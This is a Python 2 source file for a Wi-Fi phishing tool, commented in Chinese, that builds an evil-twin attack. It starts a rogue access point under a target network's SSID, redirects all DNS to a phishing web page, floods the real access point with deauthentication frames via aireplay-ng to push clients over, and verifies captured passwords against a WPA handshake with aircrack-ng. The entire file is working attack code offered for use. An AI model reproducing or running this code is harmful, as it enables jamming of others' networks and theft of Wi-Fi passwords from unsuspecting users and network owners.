#!/usr/bin/python
# encoding: utf-8  
"""
@author: Alfons
@contact: alfons_xh@163.com
@file: Wifiphisher.py
@time: 17-6-22 上午9:22 
@version: v1.0 
"""
import sys

reload(sys)
sys.setdefaultencoding('utf-8')
import time
import logging
import traceback
# import WWSGC
import threading
import subprocess
from subprocess import Popen
import WifiphisherHTTPServer

PASSWORD_PATH = '/.ygprog/wifilz/wifiphisher/password'

NETWORK_IP = "192.168.144.0"
NETWORK_GW_IP = "192.168.144.1"
NETWORK_MASK = "255.255.255.0"
# DNS_SERVICE = '8.8.8.8'
DNS_SERVICE = '192.168.144.1'
DHCP_RANGE = "192.168.144.2,192.168.144.250,255.255.255.0,1h"
HTTP_PORT = 8080
SSL_PORT = 443


def CheckShellResult(cmd_list, expect):
    """
    检查调用系统命令结果是否符合期望
    :param cmd_list: 所执行的命令
    :param expect: 期望的结果
    :return: 正确True，错误False
    """
    proc = subprocess.check_output(cmd_list)
    if expect not in proc:
        return False
    return True


class Wifiphisher(threading.Thread):
    def __init__(self):
        """
        初始化程序
        """
        threading.Thread.__init__(self, name = 'Wifiphisher')
        self.__ap_interface = None
        self.__ap_ssid = None
        self.__ap_channel = None
        self.__hostapd_cfg_path = None
        self.__dhcp_cfg_path = None

        self.__hostapd_proc = None
        self.__dnsmasq_proc = None
        self.__deauth_proc = None
        self.__webserver_proc = None

        self.__mon_interface = None
        self.__target_ap_mac = None

        self.__aireplay_path = None
        self.__aircrack_path = None

        self.__wpa_file_path = None

        self.__password = None              # 捕获到的密码
        self.IsException = False            # 程序是否异常
        self.IsRunning = False              # 程序是否正在运行

    def SetParams(self, ap_interface ='', ap_ssid ='', ap_channel = '',
                  hostapd_cfg_path = '', dhcp_cfg_path = '',
                  mon_interface ='', target_ap_mac = '',
                  airreplay_path = '', aircrack_path = '',
                  wpa_file =''):
        """
        配置钓鱼AP相关参数
        :param ap_interface:        启动钓鱼AP所使用的网卡接口
        :param ap_ssid:             钓鱼AP的ssid
        :param ap_channel:          钓鱼AP的信道
        :param hostapd_cfg_path:    钓鱼AP的hostapd配置文件路径
        :param dhcp_cfg_path:       钓鱼AP的dnsmasq配置文件路径
        :param mon_interface:       阻断目标AP信号所用网卡接口
        :param target_ap_mac:       目标AP的mac地址
        :param airreplay_path:      阻断程序全路径
        :param aircrack_path:       破解程序全路径
        :param wpa_file:            破解文件全路径
        :return: 正确True，错误False
        """
        self.__ap_interface = ap_interface
        self.__ap_ssid = ap_ssid
        self.__ap_channel = ap_channel

        self.__hostapd_cfg_path = hostapd_cfg_path if hostapd_cfg_path else WWSGC.FILE_WifiphisherApCnf()

        WWSGC.KillProcByName('dnsmasq')
        self.__dhcp_cfg_path = dhcp_cfg_path if dhcp_cfg_path else WWSGC.FILE_WifiphisherDHCPCnf()

        self.__mon_interface = mon_interface

        self.__target_ap_mac = target_ap_mac

        self.__aireplay_path = airreplay_path if airreplay_path else WWSGC.PROG_airreplay()
        self.__aircrack_path = aircrack_path if aircrack_path else WWSGC.PROG_aircrack()

        self.__wpa_file_path = wpa_file

    def StartWifiphisher(self):
        """
        启动社工破解
        :return: 成功True， 失败False
        """
        try:
            if self.is_alive():
                logging.debug('钓鱼AP已经启动，不能重新启动!')
                return False
        except:
            logging.error("启动wifiphisher错误：%s" % traceback.format_exc())
            return False
        self.IsException = False
        self.IsRunning = True
        self.start()
        return True

    def StopWifiphisher(self):
        """
        外部要求停止功能
        :return:
        """
        if not self.IsRunning:
            return

        self.IsRunning = False
        try:
            if self.__dnsmasq_proc is not None:
                # 启动dnsmasq会出现两个线程
                WWSGC.KillProcByName('dnsmasq')
            if self.__hostapd_proc is not None:
                WWSGC.KillProcByPIDAndName(self.__hostapd_proc.pid, 'hostapd')
            if self.__deauth_proc is not None:
                WWSGC.KillProcByPIDAndName(self.__deauth_proc.pid, WWSGC.PROG_airreplay(True), 1)

            if self.__webserver_proc.is_alive():
                self.__webserver_proc.StopHTTPServer()

            self.IsException = False
        except:
            logging.debug("%s" % traceback.format_exc())

    def GetPassword(self):
        return self.__password

    def __CheckInterfacesMode(self):
        """
        检查网卡接口模式
        :return: 正确True，错误False
        """
        mon_mode_cmd = ['iw', 'dev', self.__mon_interface, 'info']
        mode_expect = 'type monitor'
        return CheckShellResult(mon_mode_cmd, mode_expect)

    def __CheckPassword(self, password):
        """
        通过握手包验证捕获到的密码是否正确
        :param password: 捕获到的密码
        :return: 成功 True，失败 False
        """
        try:
            # 打开密码存储文件，并写入获取到的密码
            with open(PASSWORD_PATH, 'w') as password_file:
                password_file.write(password)

            # 对获取到的密码进行验证
            aircrack_cmd = [self.__aircrack_path, '-w', PASSWORD_PATH, self.__wpa_file_path]
            expect = 'KEY FOUND! [ ' + password + ' ]'
            return CheckShellResult(aircrack_cmd, expect)
        except:
            logging.error('验证密码错误 : %s' % traceback.format_exc())
            return False

    def __StartHostapd(self):
        """
        开启Hostapd功能
        :return: 成功True，失败False
        """
        # 钓鱼AP Hostapd配置
        config = (
            'interface=%s\n'
            'driver=nl80211\n'
            'ssid=%s\n'
            'hw_mode=g\n'
            'channel=%s\n'
            'macaddr_acl=0\n'
            'ignore_broadcast_ssid=0\n'
        ) % (self.__ap_interface, self.__ap_ssid, self.__ap_channel)

        try:
            with open(self.__hostapd_cfg_path, 'w') as hostapd_conf:
                hostapd_conf.write(config.encode(encoding = 'UTF-8'))

            # 设置网卡up
            Popen(['ifconfig', self.__ap_interface, 'up'], close_fds = True)

            # 启动hostapd进程
            self.__hostapd_proc = Popen([WWSGC.PROG_hostapd(), self.__hostapd_cfg_path], close_fds = True)
            time.sleep(5)

            if self.__hostapd_proc.poll() is not None:
                raise KeyboardInterrupt
        except KeyboardInterrupt:
            logging.error('hostapd进程启动错误 : %s' % traceback.format_exc())
            return False
        return True

    def __StartDnsmasq(self):
        """
        开启DHCP功能
        :return: 成功True，失败False
        """
        # 钓鱼AP DHCP配置
        config = (
            'interface=%s\n'
            'listen-address=%s\n'
            'dhcp-range=%s\n'
            'dhcp-option=3,%s\n'
            'dhcp-option=6,%s\n'
            'address=/#/%s'
        ) % (self.__ap_interface, NETWORK_GW_IP, DHCP_RANGE, NETWORK_GW_IP, DNS_SERVICE, DNS_SERVICE)

        try:
            with open(self.__dhcp_cfg_path, 'w') as dhcp_cnf:
                dhcp_cnf.write(config.encode(encoding='UTF-8'))

            # 开启dnsmasq
            self.__dnsmasq_proc = Popen(['dnsmasq', '-C', self.__dhcp_cfg_path], close_fds = True)

            # 设置网卡地址
            Popen(['ifconfig', str(self.__ap_interface), 'up', NETWORK_GW_IP, 'netmask', NETWORK_MASK], close_fds = True)

            # 检测网卡是否正确配置
            cmdList = ['ifconfig', str(self.__ap_interface)]
            expect = NETWORK_GW_IP
            if not CheckShellResult(cmdList, expect):
                logging.error('启动DHCP错误,网卡配置错误!')
                return False

        except:
            logging.error('启动DHCP错误 : %s' % traceback.format_exc())
            return False
        return True

    def __StartHTTPServer(self):
        """
        开启钓鱼Web服务器
        :return: 成功True，失败False
        """
        try:
            self.__webserver_proc = WifiphisherHTTPServer.WifiphisherHTTPServer()
            self.__webserver_proc.StartHTTPServer(NETWORK_GW_IP, HTTP_PORT, SSL_PORT, self.__ap_ssid)
        except:
            logging.error('启动WifiphisherHttp错误 : %s' % traceback.format_exc())
            return False
        return True

    def __StopTargetAP(self):
        """
        阻断目标AP
        :return: 成功 True，失败 False
        """
        # 改变monitor模式网卡的信道，以便阻断目标AP信号Popen(cmd_deauth, close_fds = True)
        try:
            cmd_change_channel = ['iwconfig', self.__mon_interface, 'channel', str(self.__ap_channel)]
            Popen(cmd_change_channel, close_fds = True)

            # 阻断目标AP信号
            cmd_deauth= [self.__aireplay_path, '-0', '0', '-a', self.__target_ap_mac,
                         self.__mon_interface, '--ignore-negative-one']
            self.__deauth_proc = Popen(cmd_deauth, close_fds = True)
            time.sleep(5)

        except:
            logging.error("Wifiphisher阻断目标AP失败:%s" % traceback.format_exc())
            return False
        return True

    def __CheckAndRestartThread(self):
        """
        检查相关线程是否正常启动,没有则重启该线程
        """
        try:
            if self.__hostapd_proc.poll() is not None:
                WWSGC.KillProcByPIDAndName(self.__hostapd_proc.pid, 'hostapd')
                self.__StartHostapd()
                time.sleep(5)

            if not self.__webserver_proc.is_alive():
                self.__StartHTTPServer()

            if self.__deauth_proc.poll() is not None:
                WWSGC.KillProcByPIDAndName(self.__deauth_proc.pid, WWSGC.PROG_airreplay(True), 1)
                self.__StopTargetAP()
                time.sleep(10)
        except:
            logging.error("Wifiphisher检到线程启动失败！")
            raise KeyboardInterrupt

    def run(self):
        """
        重载线程运行函数
        :return: 成功True，失败False
        """
        logging.info('线程【钓鱼AP工作】启动')
        try:
            # 检查网卡模式
            if not self.__CheckInterfacesMode():
                raise KeyboardInterrupt

            # 启动hostapd
            if not self.__StartHostapd():
                raise KeyboardInterrupt

            # 启动dnsmasq
            if not self.__StartDnsmasq():
                raise KeyboardInterrupt

            # 启动HTTP服务器
            if not self.__StartHTTPServer():
                raise KeyboardInterrupt

            # 启动阻断
            if not self.__StopTargetAP():
                raise KeyboardInterrupt

            # 主体循环，分析目标AP密码
            while True:
                time.sleep(3)

                if not self.IsRunning:
                    break

                # 检测四个主要的线程是否正常工作
                self.__CheckAndRestartThread()

                if not WifiphisherHTTPServer.terminate:
                    continue
                WifiphisherHTTPServer.terminate = False
                password_tmp = WifiphisherHTTPServer.password
                if self.__CheckPassword(password_tmp):
                    self.__password = password_tmp
                    break
        except KeyboardInterrupt:
            self.IsException = True
            logging.error('Wifiphisher 错误:%s' % traceback.format_exc())
        self.StopWifiphisher()

